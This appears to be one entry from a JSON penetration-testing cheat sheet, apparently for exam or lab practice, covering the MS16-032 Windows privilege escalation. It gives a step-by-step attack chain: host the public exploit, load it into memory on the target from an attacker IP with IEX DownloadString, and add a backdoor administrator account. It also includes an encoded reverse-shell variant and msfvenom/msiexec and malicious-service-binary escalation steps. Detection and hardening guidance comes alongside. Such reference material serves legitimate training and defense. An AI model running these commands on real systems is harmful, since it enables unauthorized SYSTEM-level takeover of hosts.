      "id": "chain-ms16-032",
      "name": "Attack Chain - MS16-032 Local Admin",
      "command": "# host Invoke-MS16-032.ps1, load it in-memory, run it to add a local admin",
      "description": "End-to-end MS16-032 chain: stage the exploit on your host, pull it into memory on target (no disk write), run it to add an administrator, then verify - the full context, in order.",
      "steps": [
        {
          "label": "1. Host the exploit (attacker/Kali)",
          "command": "wget https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/master/Invoke-MS16-032.ps1\npython3 -m http.server 80"
        },
        {
          "label": "2. Load in memory (target)",
          "command": "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.3/Invoke-MS16-032.ps1')"
        },
        {
          "label": "3. Run - add local admin (target)",
          "command": "Invoke-MS16-032 -Command \"net user hacker P@ssw0rd! /add && net localgroup administrators hacker /add\""
        },
        {
          "label": "4. Verify (target)",
          "command": "net user hacker\nnet localgroup administrators"
        },
        {
          "label": "Alt: reverse shell as SYSTEM",
          "command": "Invoke-MS16-032 -Command \"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc <base64_revshell>\""
        }
      ],
      "opsec": "loud",
      "mitre": [
        "T1068"
      ],
      "exam": "exam-ok",
      "defense": {
        "why_it_works": "MS16-032 abuses a race condition in the Windows Secondary Logon (seclogon) service: it fails to properly sanitize thread handles, letting a low-privileged user duplicate a SYSTEM token onto a thread they control. Reliable on unpatched Win7-10 / Server 2008-2012 with 2+ CPU cores.",
        "prerequisites": "A foothold as a low-privileged user on a host missing the MS16-032 patch, with 2+ CPU cores, and PowerShell available.",
        "impact": "Local privilege escalation to SYSTEM — enough to add a local administrator account or spawn a SYSTEM-level shell, fully controlling the host.",
        "detection": "[MITRE T1068 AN1419] Detects exploitation attempts targeting vulnerable OS components, often followed by unusual process or token behavior. Watch for a low-privileged process spawning a SYSTEM child, and for in-memory PowerShell download-and-execute (IEX (New-Object Net.WebClient).DownloadString). PowerShell script-block logging (Event 4104) captures Invoke-MS16-032.",
        "artifacts": "A new local admin account and its Event 4720 (account created) / 4732 (added to Administrators); PowerShell IEX in-memory execution; a SYSTEM process parented by a user process; encoded-command (-Enc) PowerShell if the reverse-shell path is used.",
        "prevention": "Apply the MS16-032 security update (the definitive fix). [MITRE T1068 M1051 Update Software] keep systems patched; [M1038 Execution Prevention] and [M1048 Application Isolation and Sandboxing] limit exploit impact; use application control (WDAC/AppLocker) to block unauthorized PowerShell tooling.",
        "evasion": "The PoC runs entirely in memory (IEX DownloadString) to avoid writing to disk and dodge on-disk AV; the reverse-shell variant uses an encoded (-Enc) command to obscure the payload.",
        "sources": [
          "HTB M26",
          "MITRE T1068"
        ],
        "misconfiguration": "Windows systems accumulate privilege escalation paths over time: scheduled tasks running as SYSTEM with world-writable scripts, service binaries with weak DACL (non-admins can overwrite), AlwaysInstallElevated enabled (any MSI installs as SYSTEM), or SeImpersonatePrivilege granted to web/service accounts.",
        "vulnerable_config": "# AlwaysInstallElevated (any user installs MSI as SYSTEM):\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n# Both = 1  ->  msfvenom -p windows/exec CMD=calc.exe -f msi > priv.msi; msiexec /quiet /i priv.msi\n\n# Service binary with weak DACL:\nicacls C:\\Program Files\\VulnSvc\\svc.exe\n# BUILTIN\\Users:(F)  <-- any user has Full Control -> replace with malicious binary",
        "secure_config": "# Disable AlwaysInstallElevated:\n# GPO: Computer Config > Admin Templates > Windows Components > Windows Installer\n#   'Always install with elevated privileges' = Disabled\n# Registry (both keys required):\nSet-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer' -Name AlwaysInstallElevated -Value 0\nSet-ItemProperty -Path 'HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer' -Name AlwaysInstallElevated -Value 0\n\n# Fix service binary DACLs:\nicacls 'C:\\Program Files\\VulnSvc\\svc.exe' /inheritance:r /grant:r 'NT AUTHORITY\\SYSTEM:(F)' 'BUILTIN\\Administrators:(F)'\n# Remove all non-admin write permissions\n\n# Audit with PowerUp or PrivescCheck:\n# Invoke-PrivescCheck -Thorough  # comprehensive privesc surface audit\n# Run monthly and after any software installation"
      }
